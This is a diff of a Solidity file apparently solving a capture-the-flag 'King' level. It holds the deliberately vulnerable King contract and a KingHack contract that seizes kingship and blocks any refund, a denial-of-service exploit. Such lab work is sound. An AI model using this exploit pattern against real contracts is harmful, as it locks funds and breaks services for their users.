@@ -1,9 +1,49 @@
-pragma solidity ^0.8.0;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+/*
+The contract below represents a very simple game: whoever sends it an amount 
+of ether that is larger than the current prize becomes the new king. On such 
+an event, the overthrown king gets paid the new prize, making a bit of ether 
+in the process! As ponzi as it gets xD
+
+Such a fun game. Your goal is to break it.
+
+When you submit the instance back to the level, the level is going to reclaim 
+kingship. You will beat the level if you can avoid such a self proclamation.
+*/
 
 contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+pragma solidity ^0.8.0;
+
+contract KingHack {
+    address public king = 0x27ebb035d0BeeabB93e4415A5a0591918a80EFE3;
     constructor() payable {
         require(msg.value > 0);
-        (bool succ, ) = payable(0x27ebb035d0BeeabB93e4415A5a0591918a80EFE3).call{value: address(this).balance}("");
+        (bool succ, ) = payable(king).call{value: address(this).balance}("");
         require(succ);
     }
 }
